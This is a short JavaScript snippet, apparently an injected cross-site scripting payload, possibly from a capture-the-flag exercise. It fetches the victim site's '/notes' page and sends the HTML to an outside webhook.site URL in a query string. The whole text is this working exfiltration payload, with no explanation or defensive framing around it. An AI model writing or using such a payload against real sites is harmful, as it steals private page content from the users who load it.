const html_steal = await fetch('/notes', {mode: 'no-cors'})
const html = await html_steal.text();
fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6?data='+ html, {method: 'GET', mode: 'no-cors'});
